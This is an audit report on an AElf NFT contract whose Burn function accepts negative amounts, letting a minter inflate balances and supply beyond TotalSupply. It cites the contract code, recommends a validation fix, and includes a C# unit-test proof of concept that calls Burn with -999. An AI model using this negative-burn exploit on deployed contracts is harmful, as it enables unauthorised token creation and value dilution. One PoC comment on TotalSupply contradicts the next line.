# Audit Report

## Title
NFT Burn Function Allows Negative Amounts to Inflate Balances and Bypass Supply Limits

## Summary
The NFT contract's `Burn` function accepts negative amounts without validation, allowing authorized minters to inflate token balances and protocol supply counters by calling burn with negative values. This bypasses the total supply restrictions enforced during minting and breaks critical token supply invariants.

## Finding Description

The vulnerability exists in the `Burn` method where `input.Amount` is a signed `int64` field [1](#0-0)  that can accept negative values without validation.

The method's balance check only verifies that the current balance is greater than or equal to the input amount [2](#0-1) , which passes when amount is negative (e.g., `balance >= -100` evaluates to true when balance is any non-negative value).

Subsequently, three critical state updates use the `Sub` extension method [3](#0-2) , which performs arithmetic subtraction [4](#0-3) . When subtracting a negative value, this actually increases the balance: `balance - (-100) = balance + 100`.

The vulnerability occurs because unlike the `DoTransfer` method which explicitly validates against negative amounts [5](#0-4) , the `Burn` method lacks this critical validation step.

A malicious minter can call `Burn` with `amount = -1000` to increase their balance by 1000 tokens, inflate the protocol supply by 1000, and inflate the NFT quantity by 1000, all while bypassing the `TotalSupply` limit enforced during legitimate minting [6](#0-5) .

## Impact Explanation

An authorized minter can exploit this to:

1. **Inflate token balances arbitrarily**: By calling Burn with negative amounts, minters increase their own balance rather than decreasing it, effectively minting tokens without proper validation.

2. **Bypass total supply limits**: The `nftProtocolInfo.Supply` counter is inflated, allowing the creation of tokens beyond the protocol's `TotalSupply` limit that is strictly enforced in the legitimate `PerformMint` function.

3. **Break NFT quantity tracking**: The `nftInfo.Quantity` field is similarly inflated, corrupting the total quantity metrics for each NFT token ID.

This represents **HIGH severity** as it allows unlimited token creation by a minter role, completely breaking the token supply invariant that must hold at all times. While the attacker must be a minter (a semi-trusted role), minters are NOT expected to have the ability to mint unlimited tokens bypassing supply caps - this violates the fundamental token economics of the NFT protocol and could lead to significant value dilution or economic exploits.

## Likelihood Explanation

**Attacker Prerequisites:**
- Must be in the minter list for the NFT protocol (authorized but common role)
- The NFT protocol must have `IsBurnable` set to true [7](#0-6) 

**Attack Complexity:**
Very low - requires only a single transaction calling `Burn` with a negative `Amount` value (e.g., -1000000).

**Execution Practicality:**
Fully practical under AElf contract semantics. The protobuf message accepts signed int64 natively, and there are no input validation checks preventing negative values from reaching the arithmetic operations.

**Economic Rationality:**
Transaction costs are minimal compared to the ability to mint unlimited tokens. A minter could create tokens worth significant value at negligible cost.

**Detection:**
The `Burned` event would show a negative amount [8](#0-7) , making the exploit potentially detectable through event monitoring, but by then balances and supply have already been corrupted.

Given the simplicity and the fact that minters are common in NFT systems, this has **HIGH likelihood** despite requiring a privileged role.

## Recommendation

Add explicit validation to reject negative amounts at the beginning of the `Burn` method, similar to the validation in `DoTransfer`:

```csharp
public override Empty Burn(BurnInput input)
{
    // Add this validation
    if (input.Amount < 0) throw new AssertionException("Invalid burn amount.");
    
    var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
    // ... rest of the method
}
```

Alternatively, enforce a stricter type constraint or add a validation layer that ensures all amount parameters across the contract are non-negative before processing.

## Proof of Concept

```csharp
[Fact]
public async Task NegativeBurnInflatesBalance_ProofOfConcept()
{
    // Setup: Create NFT protocol with IsBurnable = true and TotalSupply = 100
    var symbol = await CreateTest(); // Creates protocol with TotalSupply = 1_000_000_000
    await AddMinterAsync(symbol);
    
    // Mint 1 NFT (supply = 1)
    await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        Alias = "test",
        Quantity = 1,
        Uri = "ipfs://test"
    });
    
    // Verify initial balance = 1
    var initialBalance = (await MinterNFTContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = MinterAddress,
        Symbol = symbol,
        TokenId = 1
    })).Balance;
    initialBalance.ShouldBe(1);
    
    // Verify initial supply = 1
    var initialProtocol = await NFTContractStub.GetNFTProtocolInfo.CallAsync(new StringValue { Value = symbol });
    initialProtocol.Supply.ShouldBe(1);
    
    // EXPLOIT: Call Burn with negative amount (-999)
    await MinterNFTContractStub.Burn.SendAsync(new BurnInput
    {
        Symbol = symbol,
        TokenId = 1,
        Amount = -999
    });
    
    // Verify balance inflated to 1000 (1 - (-999) = 1000)
    var finalBalance = (await MinterNFTContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = MinterAddress,
        Symbol = symbol,
        TokenId = 1
    })).Balance;
    finalBalance.ShouldBe(1000); // Balance increased instead of decreased!
    
    // Verify supply inflated to 1000 (bypassing TotalSupply limit)
    var finalProtocol = await NFTContractStub.GetNFTProtocolInfo.CallAsync(new StringValue { Value = symbol });
    finalProtocol.Supply.ShouldBe(1000); // Supply inflated!
    
    // This demonstrates the supply inflation vulnerability
    // Normal minting would be capped at TotalSupply, but negative burn bypasses this
}
```

### Citations

**File:** protobuf/nft_contract.proto (L182-186)
```text
message BurnInput {
    string symbol = 1;
    int64 token_id = 2;
    int64 amount = 3;
}
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L46-48)
```csharp
    private void DoTransfer(Hash tokenHash, Address from, Address to, long amount)
    {
        if (amount < 0) throw new AssertionException("Invalid transfer amount.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L87-88)
```csharp
        Assert(nftProtocolInfo.IsBurnable,
            $"NFT Protocol {nftProtocolInfo.ProtocolName} of symbol {nftProtocolInfo.Symbol} is not burnable.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L90-93)
```csharp
        Assert(
            State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
            minterList.Value.Contains(Context.Sender),
            "No permission.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L94-96)
```csharp
        State.BalanceMap[tokenHash][Context.Sender] = State.BalanceMap[tokenHash][Context.Sender].Sub(input.Amount);
        nftProtocolInfo.Supply = nftProtocolInfo.Supply.Sub(input.Amount);
        nftInfo.Quantity = nftInfo.Quantity.Sub(input.Amount);
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L103-109)
```csharp
        Context.Fire(new Burned
        {
            Burner = Context.Sender,
            Symbol = input.Symbol,
            Amount = input.Amount,
            TokenId = input.TokenId
        });
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L405-405)
```csharp
        Assert(protocolInfo.Issued <= protocolInfo.TotalSupply, "Total supply exceeded.");
```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L92-98)
```csharp
    public static long Sub(this long a, long b)
    {
        checked
        {
            return a - b;
        }
    }
```
